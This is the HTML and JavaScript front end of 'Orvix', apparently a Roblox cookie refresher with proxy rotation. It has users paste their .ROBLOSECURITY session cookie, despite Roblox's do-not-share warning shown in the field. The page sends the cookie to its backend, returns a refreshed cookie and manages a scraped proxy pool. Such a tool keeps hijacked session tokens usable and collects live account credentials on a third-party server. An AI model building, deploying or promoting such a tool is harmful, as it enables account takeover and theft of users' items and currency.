<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Orvix — Roblox Cookie Refresher</title>
  <link rel="stylesheet" href="/static/style.css" />
</head>
<body>
  <div class="shell">
    <header>
      <h1>Orvix</h1>
      <p class="tag">roblox cookie refresher · proxy rotation</p>
    </header>

    <main>
      <section class="card">
        <label for="cookie">Paste your <code>.ROBLOSECURITY</code> cookie</label>
        <textarea id="cookie" rows="4"
          placeholder="_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_..."></textarea>
        <div class="actions">
          <button id="btn-refresh" class="primary">Refresh Cookie</button>
          <button id="btn-validate" class="ghost">Validate Only</button>
        </div>
      </section>

      <section id="result" class="card hidden">
        <h2>Result</h2>
        <div id="result-body"></div>
      </section>

      <section class="card stats">
        <h2>Proxy Pool</h2>
        <div id="proxy-stats">Loading...</div>
        <button id="btn-scrape" class="ghost">Re-scrape Proxies</button>
      </section>
    </main>

    <footer>
      <p>made by <a href="https://discord.gg/latentai">latentai</a></p>
    </footer>
  </div>

  <script>
    const $ = (id) => document.getElementById(id);

    async function loadStats() {
      try {
        const r = await fetch("/api/proxies");
        const d = await r.json();
        $("proxy-stats").innerHTML =
          `<span class="ok">${d.total}</span> proxies loaded`;
      } catch {
        $("proxy-stats").textContent = "Failed to load stats.";
      }
    }

    $("btn-refresh").onclick = async () => {
      const cookie = $("cookie").value.trim();
      if (!cookie) return alert("Paste a cookie first.");
      const btn = $("btn-refresh");
      btn.disabled = true;
      btn.textContent = "Refreshing...";

      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 300000);

      try {
        const r = await fetch("/api/refresh", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ cookie }),
          signal: controller.signal,
        });
        const d = await r.json();
        showResult(d);
      } catch (e) {
        if (e.name === "AbortError") {
          showResult({
            ok: false,
            error: "Client timed out after 5 minutes. Check Railway logs — backend may still be working.",
          });
        } else {
          showResult({ ok: false, error: "Request failed: " + e.message });
        }
      } finally {
        clearTimeout(timeoutId);
        btn.disabled = false;
        btn.textContent = "Refresh Cookie";
      }
    };

    $("btn-validate").onclick = async () => {
      const cookie = $("cookie").value.trim();
      if (!cookie) return alert("Paste a cookie first.");
      const btn = $("btn-validate");
      btn.disabled = true;
      btn.textContent = "Validating...";
      try {
        const r = await fetch("/api/validate", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ cookie }),
        });
        const d = await r.json();
        showResult({
          ok: d.ok,
          valid: d.valid,
          message: d.valid ? "Cookie is valid." : (d.error || "Cookie is invalid or expired."),
        });
      } catch (e) {
        showResult({ ok: false, error: "Request failed: " + e.message });
      } finally {
        btn.disabled = false;
        btn.textContent = "Validate Only";
      }
    };

    $("btn-scrape").onclick = async () => {
      await fetch("/api/scrape", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: "{}",
      });
      alert("Scrape started. Check back in ~60s, then reload.");
    };

    function showResult(d) {
      const box = $("result");
      const body = $("result-body");
      box.classList.remove("hidden");

      if (d.ok && d.cookie) {
        body.innerHTML = `
          <p class="ok">New cookie via <b>${d.method || "proxy"}</b>
          ${d.proxy ? `(${d.proxy})` : ""} · ${d.attempts || "?"} attempt(s).</p>
          <textarea rows="4" readonly id="newcookie">${d.cookie}</textarea>
          <button class="ghost" onclick="navigator.clipboard.writeText(document.getElementById('newcookie').value)">Copy</button>
        `;
      } else {
        const attemptsHtml = d.attempts
          ? `<pre>${JSON.stringify(d.attempts, null, 2)}</pre>`
          : "";
        body.innerHTML = `
          <p class="err">${d.error || d.message || "Unknown error."}</p>
          ${attemptsHtml}
        `;
      }
    }

    loadStats();
  </script>
</body>
</html>
